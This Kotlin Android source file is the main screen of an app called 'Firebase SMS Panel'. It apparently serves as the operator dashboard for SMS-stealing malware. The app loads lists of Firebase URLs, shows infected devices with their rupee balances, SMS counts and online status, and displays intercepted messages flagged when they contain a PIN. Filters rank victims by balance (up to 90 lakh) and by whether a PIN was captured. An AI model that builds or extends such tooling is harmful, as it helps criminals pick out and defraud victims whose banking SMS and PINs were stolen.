package com.firebasepanel.sms

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.FilterChip
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import com.firebasepanel.sms.domain.ConnectionFilter
import com.firebasepanel.sms.domain.PinFilter
import com.firebasepanel.sms.domain.SortMode
import com.firebasepanel.sms.ui.PanelViewModel
import java.text.NumberFormat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : ComponentActivity() {
    private val vm: PanelViewModel by viewModels()

    private val pickTxt =
        registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
            if (uri != null) {
                vm.loadUrlsFromTxt(this, uri)
            }
        }

    @OptIn(ExperimentalMaterial3Api::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme {
                val state by vm.state.collectAsState()
                Scaffold(
                    topBar = {
                        TopAppBar(
                            title = { Text("Firebase SMS Panel") },
                        )
                    },
                ) { padding ->
                    Column(
                        modifier =
                            Modifier
                                .fillMaxSize()
                                .padding(padding)
                                .padding(12.dp),
                    ) {
                        Button(onClick = { pickTxt.launch(arrayOf("text/*", "application/octet-stream")) }) {
                            Text("TXT se Firebase URLs")
                        }
                        Text(
                            "Loaded: ${state.urlsLoaded} | ${state.progress}",
                            modifier = Modifier.padding(vertical = 8.dp),
                        )
                        state.error?.let { Text("Error: $it", color = MaterialTheme.colorScheme.error) }

                        FilterBar(vm)

                        LazyColumn(modifier = Modifier.weight(1f)) {
                            items(state.devices) { row ->
                                Card(
                                    modifier =
                                        Modifier
                                            .fillMaxWidth()
                                            .padding(4.dp)
                                            .clickable { vm.selectDevice(row) },
                                ) {
                                    Column(Modifier.padding(12.dp)) {
                                        Text(
                                            "${row.deviceId}  ·  ₹ ${formatInr(row.maxBalance)}  ·  ${row.smsCount} SMS",
                                        )
                                        Text(
                                            "${if (row.online) "🟢" else "🔴"} ${row.firebaseUrl}",
                                            style = MaterialTheme.typography.bodySmall,
                                        )
                                        Text(
                                            "PIN device: ${if (row.deviceHasPin) "YES" else "NO"}",
                                            style = MaterialTheme.typography.labelSmall,
                                        )
                                    }
                                }
                            }
                        }

                        state.selected?.let { d ->
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(Modifier.padding(12.dp)) {
                                    Row(horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                                        Text("Device detail", style = MaterialTheme.typography.titleMedium)
                                        Button(onClick = { vm.clearSelection() }) { Text("Close") }
                                    }
                                    Text("Device: ${d.deviceId}")
                                    Text("Firebase: ${d.firebaseUrl}")
                                    Text("${if (d.online) "Online" else "Offline"} · PIN: ${if (d.deviceHasPin) "YES" else "NO"}")
                                    Column(
                                        modifier =
                                            Modifier
                                                .fillMaxWidth()
                                                .verticalScroll(rememberScrollState()),
                                    ) {
                                        d.messages.forEach { m ->
                                            Text(
                                                "${formatTs(m.messageAtMillis)} | ${m.sender}\n₹${m.balance ?: "-"} ${if (m.hasPinText) "· PIN-SMS" else ""}\n${m.body.take(400)}",
                                                modifier = Modifier.padding(vertical = 6.dp),
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun FilterBar(vm: PanelViewModel) {
    val state by vm.state.collectAsState()
    val cfg = state.config
    Column {
        Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
            FilterChip(selected = cfg.sortMode == SortMode.HIGH_TO_LOW, onClick = {
                vm.updateConfig { it.copy(sortMode = SortMode.HIGH_TO_LOW) }
                vm.applyFilters()
            }, label = { Text("High→Low 50K–90L") })
            FilterChip(selected = cfg.sortMode == SortMode.LOW_TO_HIGH, onClick = {
                vm.updateConfig { it.copy(sortMode = SortMode.LOW_TO_HIGH) }
                vm.applyFilters()
            }, label = { Text("Low→High 2K–50K") })
        }
        Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
            FilterChip(selected = cfg.pinFilter == PinFilter.WITH, onClick = {
                vm.updateConfig { it.copy(pinFilter = PinFilter.WITH) }
                vm.applyFilters()
            }, label = { Text("With PIN") })
            FilterChip(selected = cfg.pinFilter == PinFilter.WITHOUT, onClick = {
                vm.updateConfig { it.copy(pinFilter = PinFilter.WITHOUT) }
                vm.applyFilters()
            }, label = { Text("Without PIN") })
            FilterChip(selected = cfg.pinFilter == PinFilter.BOTH, onClick = {
                vm.updateConfig { it.copy(pinFilter = PinFilter.BOTH) }
                vm.applyFilters()
            }, label = { Text("Both") })
        }
        Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
            FilterChip(selected = cfg.connection == ConnectionFilter.ONLINE, onClick = {
                vm.updateConfig { it.copy(connection = ConnectionFilter.ONLINE) }
                vm.applyFilters()
            }, label = { Text("Online") })
            FilterChip(selected = cfg.connection == ConnectionFilter.OFFLINE, onClick = {
                vm.updateConfig { it.copy(connection = ConnectionFilter.OFFLINE) }
                vm.applyFilters()
            }, label = { Text("Offline") })
            FilterChip(selected = cfg.connection == ConnectionFilter.BOTH, onClick = {
                vm.updateConfig { it.copy(connection = ConnectionFilter.BOTH) }
                vm.applyFilters()
            }, label = { Text("Both") })
        }
        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf(1, 3, 7, 15, 30).forEach { d ->
                FilterChip(
                    selected = cfg.days == d,
                    onClick = {
                        vm.updateConfig { it.copy(days = d) }
                        vm.applyFilters()
                    },
                    label = { Text("${d}d") },
                )
            }
            FilterChip(
                selected = cfg.days == null,
                onClick = {
                    vm.updateConfig { it.copy(days = null) }
                    vm.applyFilters()
                },
                label = { Text("All") },
            )
        }
    }
}

private fun formatInr(v: Double): String {
    val nf = NumberFormat.getNumberInstance(Locale.US)
    return nf.format(v.toLong())
}

private fun formatTs(ms: Long?): String {
    if (ms == null) return ""
    return SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.US).format(Date(ms))
}
